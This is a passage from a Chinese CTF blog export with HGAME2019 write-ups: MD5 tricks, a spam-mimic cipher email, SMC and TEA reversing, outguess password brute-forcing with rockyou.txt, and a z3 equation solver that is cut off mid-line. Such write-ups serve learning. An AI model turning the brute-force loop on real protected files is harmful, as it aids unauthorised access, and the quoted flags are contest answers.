猜测是前两位不知道的md5，突发奇想加了个10上去就成功解密出hello，第一关就过了。 第二关需要两个md5相同的文件，我用了fastcoll得到了这样的文件。 最后的邮件： 1送你一封包含flag的邮件： Dear Professional ; Especially for you - this cutting-edge intelligence ! If you no longer wish to receive our publications simply reply with a Subject: of &quot;REMOVE&quot; and you will immediately be removed from our club . This mail is being sent in compliance with Senate bill 2216 , Title 9 ; Section 306 ! THIS IS NOT MULTI-LEVEL MARKETING . Why work for somebody else when you can become rich as few as 35 weeks . Have you ever noticed more people than ever are surfing the web and people will do almost anything to avoid mailing their bills . Well, now is your chance to capitalize on this ! WE will help YOU decrease perceived waiting time by 120% &amp; decrease perceived waiting time by 140% . You can begin at absolutely no cost to you . But don&apos;t believe us ! Mrs Jones of Minnesota tried us and says &quot;I was skeptical but it worked for me&quot; . We assure you that we operate within all applicable laws . Because the Internet operates on &quot;Internet time&quot; you must act now ! Sign up a friend and your friend will be rich too . Warmest regards . Dear Cybercitizen , We know you are interested in receiving red-hot announcement ! We will comply with all removal requests ! This mail is being sent in compliance with Senate bill 1619 ; Title 2 ; Section 301 . This is NOT unsolicited bulk mail ! Why work for somebody else when you can become rich within 53 MONTHS ! Have you ever noticed more people than ever are surfing the web and more people than ever are surfing the web . Well, now is your chance to capitalize on this . We will help you use credit cards on your website plus decrease perceived waiting time by 150% . The best thing about our system is that it is absolutely risk free for you ! But don&apos;t believe us ! Mrs Simpson of Washington tried us and says &quot;Now I&apos;m rich, Rich, RICH&quot; . We assure you that we operate within all applicable laws ! We beseech you - act now ! Sign up a friend and your friend will be rich too . Thank-you for your serious consideration of our offer ! Dear Friend ; This letter was specially selected to be sent to you ! If you no longer wish to receive our publications simply reply with a Subject: of &quot;REMOVE&quot; and you will immediately be removed from our mailing list . This mail is being sent in compliance with Senate bill 2716 , Title 2 ; Section 306 ! This is a ligitimate business proposal . Why work for somebody else when you can become rich inside 33 weeks . Have you ever noticed more people than ever are surfing the web plus more people than ever are surfing the web . Well, now is your chance to capitalize on this ! WE will help YOU SELL MORE and process your orders within seconds . You can begin at absolutely no cost to you . But don&apos;t believe us ! Mrs Jones of Kentucky tried us and says &quot;I was skeptical but it worked for me&quot; ! This offer is 100% legal ! We implore you - act now . Sign up a friend and you&apos;ll get a discount of 50% . God Bless . 一开始百度栅格密码，啥也百度不到，甚至以为这是栅栏密码试了半天，后来科学上网用google搜了一下，很容易就找到了解密网站。 ……等待dalao们的wp","categories":[],"tags":[]},{"title":"HGAME2019-Say-Muggle-Code a.k.a. SMC","slug":"HGAME2019-Say-Muggle-Code-a-k-a-SMC","date":"2019-02-11T17:34:36.000Z","updated":"2019-03-12T05:20:33.947Z","comments":true,"path":"2019/02/12/HGAME2019-Say-Muggle-Code-a-k-a-SMC/","link":"","permalink":"http://yoursite.com/2019/02/12/HGAME2019-Say-Muggle-Code-a-k-a-SMC/","excerpt":"首先SMC，使用python脚本：","text":"首先SMC，使用python脚本： 12345678i=0x603000key=123while 1: PatchByte(i,Byte(i)^key) i+=1 key+=1 if i == 0x603200: break 要求输入的flag长度为39，并且格式为hgame{}。 同时把括号内的内容分为两半，前面一半用check1检验，后面一半用check2检验。 check1: 每个字符异或0xe9后与data1比较，所以可以直接逆运算： 1234567891011121314151617data1=[0xDE,0xD1,0xD8,0x8C,0x8F,0xD9,0xDF,0xDE,0xDF,0x8C,0xD8,0xDA,0x8C,0xDC,0xDD,0xD8,]print &apos;&apos;.join([chr(i^0xe9) for i in data1]) 结果为781ef0676e13e541。 check2: 12345678910111213141516171819202122_DWORD *__fastcall encrypt(__int64 a1, _DWORD *a2)&#123; _DWORD *result; // rax int v3; // [rsp+10h] [rbp-10h] signed int i; // [rsp+14h] [rbp-Ch] signed int j; // [rsp+18h] [rbp-8h] v3 = 0; for ( i = 0; i &lt;= 31; ++i ) &#123; result = (_DWORD *)0x9E3779B9LL; v3 -= 0x61C88647; for ( j = 0; j &lt;= 3; j += 2 ) &#123; *(_DWORD *)(a1 + 4LL * j) = *(_DWORD *)(4LL * j + a1) + ((*(_DWORD *)(4 * (j + 1LL) + a1) + v3) ^ (16 * *(_DWORD *)(4 * (j + 1LL) + a1) + *a2) ^ ((*(_DWORD *)(4 * (j + 1LL) + a1) &gt;&gt; 5) + a2[1])); result = (_DWORD *)(4 * (j + 1LL) + a1); *result += (*(_DWORD *)(4LL * j + a1) + v3) ^ (16 * *(_DWORD *)(4LL * j + a1) + a2[2]) ^ ((*(_DWORD *)(4LL * j + a1) &gt;&gt; 5) + a2[3]); &#125; &#125; return result; TEA。 解密： 1234567891011121314151617181920212223242526#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;void decrypt (uint32_t* v, uint32_t* k) &#123; uint32_t v0=v[0], v1=v[1], v2=v[2],v3=v[3], sum=0xC6EF3720, i; uint32_t delta=0x9e3779b9; uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; for (i=0; i&lt;32; i++) &#123; v3 -= ((v2*16) + k2) ^ (v2 + sum) ^ ((v2&gt;&gt;5) + k3); v2 -= ((v3*16) + k0) ^ (v3 + sum) ^ ((v3&gt;&gt;5) + k1); v1 -= ((v0*16) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3); v0 -= ((v1*16) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1); sum -= delta; &#125; v[0]=v0; v[1]=v1; v[2]=v2; v[3]=v3;&#125;int main()&#123; uint32_t flag[4]=&#123;0xbdba0e28,0x38d1cd98,0x3ab63e63,0x535e9dac&#125;; uint32_t key[4]=&#123;0x5b3e0f37,0x0c3b0d3d,0x5d6e5f3a,0x31390d38&#125;; decrypt(flag,key); for (int i=0;i&lt;4;i++) &#123; printf(&quot;%x &quot;,flag[i]); &#125; return 0;&#125; 然而并没有得到正确的后半部分23333 鬼知道当时哪里搞来的flag和key…… 看了大佬的wp之后才发现自己flag和key完全不对orz 正确的flag直接从data2处取就行了。 key的话是利用6-22位异或，然而我一直不知道哪里出了错，只有第一位和和第二位是正确的。后来通过dalao的key反推发现，异或只在&quot;781ef0676e13e541&quot;上进行，但是我写脚本时却利用了异或之后的值继续异或，这也是只有一二位正确的原因。 正确flag与key： 12key[4] = &#123;0x54090f37,0x01065603, 0x02545301, 0x05015056&#125;;flag[4] =&#123;0xd240f52f,0x728cca9d,0xb6379fd3, 0xfba1a736&#125;; 改正后跑出后半部分：64313964 66656265 31633236 66363439 都是16进制，转换为字符得到：d91debef62c1946f 最终flag：hgame{781ef0676e13e541d91debef62c1946f} 简直回到了高中做数学题的时候，知道怎么做但是最后答案不对，还一直不到哪里错了orz","categories":[],"tags":[]},{"title":"outguess","slug":"outguess","date":"2019-02-10T09:53:55.000Z","updated":"2019-02-12T16:03:53.466Z","comments":true,"path":"2019/02/10/outguess/","link":"","permalink":"http://yoursite.com/2019/02/10/outguess/","excerpt":"记录一下记录一下。 HGAME2019WEEK3的misc1。","text":"记录一下记录一下。 HGAME2019WEEK3的misc1。 题目文件为一个mp4，下载下来看了一遍就GG了。 之后题目给了hint： 12hint1:DeEgger Embedderhint2:outguess 直接对着上网去搜就行了，首先使用DeEgger Embedder把视频提取一下，得到一个exe文件，查看hex发现应该是jpg文件，改好后缀后就该用outguess了。 outguess使用方法： 1outguess -k key -r xxx.jpg xxx.txt 但是这里密码是需要自己来爆破的，题目提示了是kali里的rockyou.txt里的密码，虽然我没装kali但是网上也可以找到这个文件，写个脚本把符合要求的密码全部写到另一个文件里，然后开始爆破。 12345678910import osf=open(&quot;sec.txt&quot;,&apos;rb&apos;) line=f.readline()i=1while line: command=&quot;outguess -k &quot;+line.replace(&quot;\\n&quot;,&quot;&quot;)+&quot; -r /Users/4eriri/Downloads/flag.jpg /Users/4eriri/Downloads/&quot;+str(i)+&quot;.txt&quot; os.system(command) line=f.readline() i+=1f.close() 这样每次爆破得到的文件就会以次数命名保存下来，然后按文件大小排序一下，那些几十个字节大小的txt就很有可能是正确密码爆破得到的。 最后在206.txt中发现了flag，正确的key是securitypassword。","categories":[],"tags":[]},{"title":"HGAME2019-Math简单","slug":"Math简单","date":"2019-02-08T13:18:21.000Z","updated":"2019-02-16T14:23:09.120Z","comments":true,"path":"2019/02/08/Math简单/","link":"","permalink":"http://yoursite.com/2019/02/08/Math简单/","excerpt":"…解一个三十二元一次方程组得到flag，再次练习了一下使用z3求解。","text":"…解一个三十二元一次方程组得到flag，再次练习了一下使用z3求解。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815816817818819820821822823824825826827828829830831832833834835836from z3 import *solver = Solver()v34 = [Int(&apos;v34%d&apos;%i) for i in range(32) ]solver.add(82 * v34[16] + 58 * v34[25] + 76 * v34[21] + 31 * v34[9] + 87 * v34[28] + 54 * v34[2] + 74 * v34[5] + 99 * v34[26] + 94 * v34[3] + 84 * v34[19] + 32 * v34[15] + 90 * v34[27] + 16 * v34[14] + 19 * v34[8] + 33 * v34[20] + 35 * v34[31] + 65 * v34[29] + 47 * v34[12] + 3 * v34[1] + 57 * v34[7] + 5 * v34[17] + 70 * v34[13] + 28 * v34[24] + 79 * v34[11] + 63 * v34[23] + 66 * v34[30] + 28 * v34[10] + v34[4] + 81 * v34[6] + 61 * v34[18] + 31 * v34[22] + 71 * v34[0] == 145397)solver.add(55 * v34[6] + 38 * v34[9] + 39 * v34[18] + 73 * v34[24] + 86 * v34[13] + 18 * v34[11] + 40 * v34[21] + 40 * v34[26] + 54 * v34[14] + 81 * v34[10] + 71 * v34[27] + 20 * v34[8] + 16 * v34[28] + 65 * v34[30] + 87 * v34[3] + 14 * v34[16] + v34[5] + 41 * v34[0] + 58 * v34[15] + 73 * v34[2] + 46 * v34[23] + 7 * v34[19] + 89 * v34[17] + 65 * v34[25] + 43 * v34[7] + 6 * v34[20] + 60 * v34[12] + 40 * v34[31] + 57 * v34[29] + 40 * v34[4] + 30 * v34[1] + 63 * v34[22] == 127517)solver.add(28 * v34[6] + 17 * v34[21] + 18 * v34[3] + 53 * v34[10] + 82 * v34[14] + 70 * v34[5] + 84 * v34[2] + 57 * v34[19] + 92 * v34[27] + 57 * v34[11] + 77 * v34[4] + 49 * v34[8] + 62 * v34[29] + 97 * v34[22] + 47 * v34[1] + 30 * v34[16] + 45 * v34[30] + 94 * v34[28] + 6 * v34[9] + 83 * v34[20] + 18 * v34[23] + 97 * v34[15] + 11 * v34[12] + 35 * v34[7] + 81 * v34[26] + 67 * v34[13] + 11 * v34[31] + 84 * v34[24] + 63 * v34[25] + 61 * v34[18] == 141411)solver.add(86 * v34[23] + 52 * v34[1] + 14 * v34[24] + 46 * v34[6] + 56 * v34[7] + 13 * v34[2] + 82 * v34[11] + 49 * v34[30] + 97 * v34[18] + 50 * v34[14] + 83 * v34[27] + 38 * v34[13] + 49 * v34[29] + 9 * v34[4] + 91 * v34[20] + 33 * v34[25] + 4 * v34[22] + 5 * v34[17] + 61 * v34[15] + 65 * v34[3] + 68 * v34[28] + 6 * v34[16] + (v34[8] * 64) + 56 * v34[9] + 67 * v34[10] + 5 * v34[5] + v34[21] + 10 * v34[19] + 83 * v34[12] + 37 * v34[26] + 85 * v34[0] == 117383)solver.add(53 * v34[3] + 91 * v34[2] + 57 * v34[25] + 66 * v34[20] + 9 * v34[28] + 63 * v34[5] + 20 * v34[4] + 96 * v34[8] + 39 * v34[11] + 91 * v34[1] + 40 * v34[9] + 85 * v34[14] + 62 * v34[16] + 95 * v34[19] + 34 * v34[22] + 67 * v34[31] + 51 * v34[27] + 45 * v34[26] + 92 * v34[15] + 91 * v34[21] + 85 * v34[13] + 12 * v34[7] + 26 * v34[23] + 56 * v34[30] + 82 * v34[18] + 72 * v34[17] + 54 * v34[6] + 17 * v34[12] + 84 * v34[29] + 17 * v34[0] + 8 * v34[24] + 63 * v34[10] == 156152)solver.add(55 * v34[23] + 88 * v34[9] + 48 * v34[4] + 83 * v34[13] + 66 * v34[7] + 60 * v34[30] + 57 * v34[6] + 85 * v34[17] + 71 * v34[28] + 98 * v34[24] + 83 * v34[10] + 12 * v34[1] + 72 * v34[31] + 12 * v34[22] + 80 * v34[20] + 15 * v34[19] + 81 * v34[21] + 87 * v34[0] + 37 * v34[16] + 4 * v34[15] + 41 * v34[3] + 84 * v34[26] + 56 * v34[25] + 84 * v34[14] + 41 * v34[27] + 98 * v34[18] + 18 * v34[2] + 95 * v34[11] + 33 * v34[29] + 66 * v34[8] == 148963)solver.add(43 * v34[16] + 47 * v34[0] + 53 * v34[24] + 75 * v34[11] + 57 * v34[21] + 63 * v34[12] + 4 * v34[14] + 59 * v34[31] + 15 * v34[23] + 12 * v34[25] + 58 * v34[5] + 40 * v34[4] + 26 * v34[30] + 8 * v34[15] + 25 * v34[6] + 97 * v34[10] + 12 * v34[28] + 74 * v34[26] + 65 * v34[8] + 93 * v34[27] + 18 * v34[22] + 84 * v34[2] + 7 * v34[1] + 22 * v34[18] + 9 * v34[17] + 89 * v34[19] + 72 * v34[13] + 47 * v34[20] + 7 * v34[29] + 8 * v34[9] + 24 * v34[7] + 75 * v34[3] == 121517)solver.add(77 * v34[30] + 89 * v34[31] + 55 * v34[7] + 86 * v34[17] + 74 * v34[0] + 72 * v34[4] + 27 * v34[20] + 88 * v34[9] + (v34[21] * 64) + 52 * v34[15] + 4 * v34[19] + 8 * v34[1] + 16 * v34[13] + 54 * v34[25] + 8 * v34[29] + 52 * v34[23] + 14 * v34[10] + 88 * v34[18] + 33 * v34[8] + 99 * v34[27] + 65 * v34[14] + 66 * v34[5] + 36 * v34[6] + 58 * v34[16] + 63 * v34[22] + 93 * v34[3] + 96 * v34[11] + 26 * v34[26] + 65 * v34[12] + 42 * v34[28] + 14 * v34[2] + 57 * v34[24] == 151446)solver.add(53 * v34[24] + 95 * v34[27] + 51 * v34[7] + 42 * v34[4] + 78 * v34[8] + 45 * v34[25] + 63 * v34[30] + 85 * v34[26] + 30 * v34[29] + 83 * v34[14] + 62 * v34[31] + 71 * v34[22] + 45 * v34[17] + (v34[6] *64 ) + 87 * v34[23] + 49 * v34[28] + 14 * v34[0] + 4 * v34[21] + 63 * v34[5] + 53 * v34[13] + 19 * v34[19] + 44 * v34[16] + 5 * v34[3] + 74 * v34[15] + 19 * v34[18] + 89 * v34[11] + 11 * v34[20] + 34 * v34[12] + 14 * v34[1] + 87 * v34[10] + 63 * v34[9] + 70 * v34[2] == 142830)solver.add(69 * v34[0] + 67 * v34[9] + 57 * v34[15] + 77 * v34[10] + 67 * v34[26] + 94 * v34[11] + 13 * v34[29] + 11 * v34[22] + 41 * v34[5] + 38 * v34[13] + 90 * v34[31] + 68 * v34[7] + 56 * v34[14] + 4 * v34[23] + 66 * v34[28] + 28 * v34[1] + 6 * v34[12] + 91 * v34[16] + 59 * v34[3] + 81 * v34[17] + 44 * v34[2] + 33 * v34[24] + 34 * v34[19] + 17 * v34[18] + 77 * v34[25] + 25 * v34[8] + 8 * v34[6] + 10 * v34[30] + 66 * v34[20] + 41 * v34[27] + 29 * v34[21] == 122585)solver.add(31 * v34[9] + 17 * v34[4] + 6 * v34[28] + 23 * v34[25] + 32 * v34[3] + 72 * v34[15] + 41 * v34[26] + 33 * v34[30] + 82 * v34[13] + 20 * v34[0] + 7 * v34[12] + 25 * v34[29] + 39 * v34[21] + 57 * v34[14] + 14 * v34[16] + 24 * v34[24] + 37 * v34[22] + 71 * v34[10] + 65 * v34[23] + 46 * v34[8] + 40 * v34[19] + 77 * v34[27] + 80 * v34[18] + 88 * v34[6] + 20 * v34[31] + 83 * v34[11] + 73 * v34[1] + 8 * v34[5] + 15 * v34[20] + 70 * v34[7] + 24 * v34[17] + 16 * v34[2] == 105293)solver.add(25 * v34[21] + 79 * v34[3] + 41 * v34[24] + 45 * v34[30] + 82 * v34[20] + 86 * v34[19] + 99 * v34[9] + 96 * v34[22] + 85 * v34[28] + 70 * v34[5] + 77 * v34[23] + 80 * v34[11] + 40 * v34[31] + 66 * v34[12] + 12 * v34[2] + 77 * v34[15] + 72 * v34[4] + 42 * v34[26] + 81 * v34[27] + 90 * v34[13] + 37 * v34[16] + 29 * v34[17] + 20 * v34[29] + 85 * v34[6] + 6 * v34[7] + 2 * v34[0] + 72 * v34[1] + 75 * v34[14] + 40 * v34[25] + 29 * v34[8] + 25 * v34[10] == 151962)solver.add(83 * v34[11] + 75 * v34[1] + 42 * v34[31] + 95 * v34[30] + 58 * v34[8] + 47 * v34[13] + 65 * v34[15] + 24 * v34[17] + 97 * v34[10] + 24 * v34[21] + 28 * v34[0] + 77 * v34[5] + 97 * v34[6] + 24 * v34[26] + 32 * v34[12] + 5 * v34[25] + 55 * v34[28] + 9 * v34[23] + 85 * v34[4] + 6 * v34[9] + 61 * v34[19] + 12 * v34[3] + 76 * v34[7] + 36 * v34[27] + 77 * v34[24] + 24 * v34[29] + 67 * v34[14] + 19 * v34[16] + 47 * v34[20] + 13 * v34[22] == 125609)solver.add(30 * v34[25] + 41 * v34[28] + 65 * v34[10] + v34[1] + 88 * v34[3] + 90 * v34[0] + 4 * v34[23] + 46 * v34[7] + 54 * v34[16] + 16 * v34[6] + 89 * v34[22] + 76 * v34[27] + 38 * v34[17] + 3 * v34[5] + 70 * v34[14] + 3 * v34[24] + 24 * v34[13] + 54 * v34[2] + 20 * v34[8] + 83 * v34[12] + 21 * v34[15] + 77 * v34[18] + 31 * v34[19] + 59 * v34[21] + 33 * v34[20] + 84 * v34[11] + 19 * v34[29] + 38 * v34[26] + 63 * v34[31] + 16 * v34[30] + 15 * v34[4] + 39 * v34[9] == 123069)solver.add(6 * v34[9] + 19 * v34[19] + 27 * v34[18] + 48 * v34[4] + 13 * v34[20] + 44 * v34[10] + 70 * v34[12] + 44 * v34[17] + 22 * v34[23] + 55 * v34[14] + 73 * v34[26] + 55 * v34[8] + 58 * v34[11] + 31 * v34[30] + 78 * v34[29] + 19 * v34[25] + 52 * v34[31] + 27 * v34[21] + 38 * v34[27] + 40 * v34[28] + 35 * v34[1] + 48 * v34[22] + 71 * v34[15] + 24 * v34[6] + 89 * v34[16] + 37 * v34[3] + 78 * v34[2] + 3 * v34[5] + 52 * v34[24] + 40 * v34[7] == 113842)solver.add(95 * v34[8] + 92 * v34[18] + 84 * v34[31] + 31 * v34[12] + 35 * v34[10] + 54 * v34[20] + 26 * v34[29] + 29 * v34[3] + 2 * v34[23] + 46 * v34[0] + 30 * v34[26] + 56 * v34[27] + 100 * v34[11] + 43 * v34[1] + 15 * v34[4] + 79 * v34[17] + 12 * v34[5] + 38 * v34[9] + 3 * v34[30] + 16 * v34[21] + 19 * v34[13] + 67 * v34[19] + 37 * v34[28] + v34[7] + 73 * v34[16] + 85 * v34[6] + 17 * v34[14] + 90 * v34[22] + 15 * v34[2] + 43 * v34[25] + 96 * v34[24] == 119824)solver.add(36 * v34[22] + 69 * v34[28] + 77 * v34[6] + 92 * v34[20] + 43 * v34[23] + 16 * v34[19] + 92 * v34[5] + 49 * v34[26] + 44 * v34[2] + 26 * v34[29] + (v34[25] * 64) + 45 * v34[24] + 99 * v34[11] + 43 * v34[4] + 75 * v34[21] + 53 * v34[31] + 18 * v34[18] + 11 * v34[13] + 52 * v34[0] + 16 * v34[8] + 9 * v34[7] + 77 * v34[16] + 33 * v34[10] + 86 * v34[1] + 33 * v34[3] + 29 * v34[9] + 6 * v34[12] + 91 * v34[14] + 36 * v34[15] + 94 * v34[27] + 13 * v34[30] + 89 * v34[17] == 135873)solver.add(16 * v34[7] + v34[15] + 82 * v34[9] + 60 * v34[29] + 68 * v34[2] + 83 * v34[10] + 47 * v34[5] + 85 * v34[13] + 22 * v34[8] + 92 * v34[27] + 75 * v34[28] + 43 * v34[3] + 29 * v34[22] + 92 * v34[0] + 54 * v34[16] + 17 * v34[30] + 78 * v34[18] + 7 * v34[23] + 69 * v34[21] + 63 * v34[31] + 71 * v34[4] + 10 * v34[6] + 66 * v34[14] + 25 * v34[26] + 32 * v34[1] + 48 * v34[19] + 86 * v34[11] + 20 * v34[25] + 78 * v34[20] + 25 * v34[17] + 76 * v34[12] + 13 * v34[24] == 142509)solver.add(88 * v34[22] + 23 * v34[13] + 18 * v34[14] + 77 * v34[9] + 56 * v34[30] + 79 * v34[2] + 71 * v34[29] + 95 * v34[28] + 87 * v34[24] + 62 * v34[16] + 85 * v34[26] + 43 * v34[20] + 67 * v34[15] + 97 * v34[8] + 80 * v34[0] + 23 * v34[3] + 95 * v34[25] + 82 * v34[21] + 66 * v34[31] + 5 * v34[4] + 66 * v34[27] + 25 * v34[12] + 4 * v34[5] + 12 * v34[7] + 85 * v34[1] + 10 * v34[6] + 45 * v34[11] + 28 * v34[18] + 26 * v34[19] + 48 * v34[23] + 45 * v34[17] == 148888)solver.add(25 * v34[8] + 81 * v34[30] + 21 * v34[6] + 72 * v34[11] + 48 * v34[18] + 2 * v34[19] + 42 * v34[10] + 22 * v34[24] + 99 * v34[2] + 78 * v34[22] + 83 * v34[12] + 60 * v34[9] + 59 * v34[13] + 15 * v34[5] + 25 * v34[20] + 43 * v34[15] + 56 * v34[28] + 33 * v34[25] + 71 * v34[23] + 31 * v34[0] + 95 * v34[3] + 73 * v34[17] + 86 * v34[14] + 15 * v34[21] + 61 * v34[7] + 12 * v34[29] + 95 * v34[26] + 13 * v34[1] + 100 * v34[16] + 11 * v34[4] + 79 * v34[27] == 138023)solver.add(37 * v34[28] + 62 * v34[25] + 42 * v34[18] + 53 * v34[27] + 52 * v34[29] + 70 * v34[22] + 35 * v34[30] + 50 * v34[16] + 59 * v34[8] + 75 * v34[10] + 55 * v34[20] + 23 * v34[0] + 52 * v34[17] + 47 * v34[3] + 91 * v34[13] + 46 * v34[7] + 42 * v34[14] + 79 * v34[26] + 87 * v34[21] + 30 * v34[6] + 26 * v34[1] + 57 * v34[31] + 33 * v34[12] + 51 * v34[9] + 56 * v34[24] + 59 * v34[11] + 36 * v34[23] + 88 * v34[4] + 28 * v34[2] + 44 * v34[15] + 19 * v34[19] + 74 * v34[5] == 142299)solver.add( 80 * v34[21] + 43 * v34[31] + 67 * v34[16] + 55 * v34[13] + 95 * v34[24] + 46 * v34[28] + 93 * v34[5] + 75 * v34[20] + 14 * v34[25] + 24 * v34[26] + 50 * v34[29] + 70 * v34[15] + 63 * v34[30] + 77 * v34[23] + 96 * v34[19] + 66 * v34[11] + 72 * v34[27] + 94 * v34[4] + 63 * v34[22] + 69 * v34[3] + 73 * v34[1] + 60 * v34[7] + 9 * v34[2] + 39 * v34[17] + 25 * v34[0] + 49 * v34[14] + 48 * v34[8] + 86 * v34[9] + 72 * v34[10] + 23 * v34[18] + 21 * v34[6] == 155777)solver.add(25 * v34[24] + 11 * v34[22] + 27 * v34[11] + 40 * v34[8] + 53 * v34[15] + 40 * v34[18] + 56 * v34[3] + 2 * v34[2] + 32 * v34[4] + 90 * v34[1] + 54 * v34[16] + 20 * v34[9] + 86 * v34[17] + 82 * v34[31] + 43 * v34[25] + 43 * v34[13] + 86 * v34[21] + 17 * v34[0] + (v34[14] * 64) + 6 * v34[30] + 86 * v34[5] + 15 * v34[7] + 46 * v34[12] + 21 * v34[26] + 90 * v34[20] + 19 * v34[6] + 93 * v34[23] + 31 * v34[27] + 62 * v34[29] + 21 * v34[19] + 42 * v34[10] == 117687)solver.add(89 * v34[21] + 100 * v34[13] + v34[27] + 66 * v34[18] + 40 * v34[17] + 17 * v34[0] + 27 * v34[19] + 26 * v34[31] + 57 * v34[24] + 35 * v34[3] + 80 * v34[1] + 67 * v34[5] + 85 * v34[6] + 7 * v34[15] + 93 * v34[8] + 3 * v34[22] + 77 * v34[12] + 12 * v34[28] + 4 * v34[2] + 27 * v34[9] + 53 * v34[25] + 37 * v34[30] + 43 * v34[23] + 33 * v34[4] + 39 * v34[26] + 7 * v34[7] + 75 * v34[10] + 15 * v34[14] + 45 * v34[20] + 36 * v34[29] + 78 * v34[11] + 31 * v34[16] == 117383)solver.add(73 * v34[20] + 16 * v34[26] + 100 * v34[5] + 71 * v34[28] + 71 * v34[16] + 4 * v34[1] + 77 * v34[31] + 83 * v34[2] + 11 * v34[30] + 53 * v34[19] + 85 * v34[12] + 67 * v34[13] + 39 * v34[8] + 45 * v34[24] + 84 * v34[22] + 99 * v34[14] + 38 * v34[3] + 29 * v34[4] + 90 * v34[9] + 61 * v34[18] + 40 * v34[7] + (v34[17] * 64) + 9 * v34[25] + 86 * v34[29] + 80 * v34[21] + 4 * v34[15] + 96 * v34[23] + 99 * v34[10] + 40 * v34[27] + 4 * v34[0] + 56 * v34[11] == 155741)solver.add((v34[12] * 64) + 76 * v34[0] + 5 * v34[11] + 87 * v34[2] + 86 * v34[24] + 76 * v34[14] + 38 * v34[23] + 85 * v34[3] + 71 * v34[22] + 42 * v34[29] + 85 * v34[30] + 14 * v34[10] + 17 * v34[13] + 42 * v34[25] + 11 * v34[19] + 44 * v34[15] + 21 * v34[4] + 60 * v34[16] + 28 * v34[6] + 46 * v34[20] + 25 * v34[9] + 77 * v34[31] + 21 * v34[8] + 85 * v34[7] + 36 * v34[1] + 91 * v34[27] + 21 * v34[28] + 38 * v34[17] + 3 * v34[26] + 61 * v34[21] + 15 * v34[5] + 32 * v34[18] == 132804)solver.add(95 * v34[30] + 75 * v34[28] + 3 * v34[10] + 36 * v34[1] + 60 * v34[3] + 84 * v34[11] + 19 * v34[26] + 76 * v34[27] + 86 * v34[16] + 92 * v34[8] + 96 * v34[14] + 60 * v34[21] + 23 * v34[4] + 60 * v34[12] + 50 * v34[23] + 78 * v34[22] + 45 * v34[9] + 42 * v34[18] + 10 * v34[2] + 60 * v34[20] + 24 * v34[24] + 77 * v34[7] + 41 * v34[6] + 29 * v34[13] + 33 * v34[5] + 2 * v34[15] + 33 * v34[29] + 39 * v34[31] + 41 * v34[25] + 100 * v34[19] + 9 * v34[17] + 79 * v34[0] == 145568)solver.add(68 * v34[5] + 98 * v34[27] + 98 * v34[16] + 10 * v34[19] + 25 * v34[26] + 98 * v34[24] + 15 * v34[6] + 50 * v34[18] + 88 * v34[20] + 74 * v34[11] + 83 * v34[1] + 86 * v34[21] + 52 * v34[7] + 39 * v34[10] + 40 * v34[13] + 82 * v34[28] + 37 * v34[3] + 45 * v34[0] + 18 * v34[25] + 2 * v34[29] + 6 * v34[12] + 78 * v34[31] + 37 * v34[2] + 57 * v34[23] + 3 * v34[4] + 59 * v34[8] + 73 * v34[15] + v34[22] + 18 * v34[9] + 35 * v34[14] + 20 * v34[17] + 54 * v34[30] == 130175)solver.add(60 * v34[10] + 50 * v34[12] + 30 * v34[29] + 90 * v34[19] + 68 * v34[23] + 60 * v34[18] + 93 * v34[20] + 100 * v34[11] + 98 * v34[14] + 32 * v34[3] + 15 * v34[21] + 79 * v34[0] + 6 * v34[24] + 62 * v34[26] + 96 * v34[6] + 68 * v34[22] + 9 * v34[7] + 88 * v34[5] + 18 * v34[27] + 70 * v34[9] + 96 * v34[25] + 89 * v34[4] + 14 * v34[31] + 83 * v34[17] + 19 * v34[15] + 44 * v34[1] + 96 * v34[8] + 87 * v34[16] + 48 * v34[2] + 95 * v34[13] + 73 * v34[28] + 92 * v34[30] == 171986)solver.add(53 * v34[30] + 87 * v34[25] + 23 * v34[29] + 80 * v34[20] + 86 * v34[9] + 20 * v34[7] + 29 * v34[16] + 31 * v34[14] + 83 * v34[26] + 11 * v34[4] + 29 * v34[19] + 82 * v34[13] + 84 * v34[10] + 70 * v34[1] + 52 * v34[12] + 40 * v34[6] + 91 * v34[8] + 6 * v34[17] + 77 * v34[28] + 56 * v34[5] + 86 * v34[23] + 63 * v34[31] + 26 * v34[27] + 19 * v34[22] + 50 * v34[3] + 15 * v34[15] + 67 * v34[2] + 37 * v34[24] + 84 * v34[18] + 81 * v34[21] + 93 * v34[0] == 151676)solver.add(29 * v34[3] + 93 * v34[5] + 67 * v34[21] + 12 * v34[11] + 82 * v34[24] + 100 * v34[8] + 29 * v34[26] + 97 * v34[12] + 32 * v34[6] + 26 * v34[27] + 46 * v34[19] + 8 * (v34[25] + 9 * v34[0] + 2 * v34[17]) + 63 * v34[10] + 39 * v34[29] + 81 * v34[15] + 51 * v34[13] + 31 * v34[30] + 49 * v34[4] + 3 * v34[22] + 26 * v34[28] + 15 * v34[20] + 89 * v34[2] + 5 * v34[31] + 47 * v34[18] + 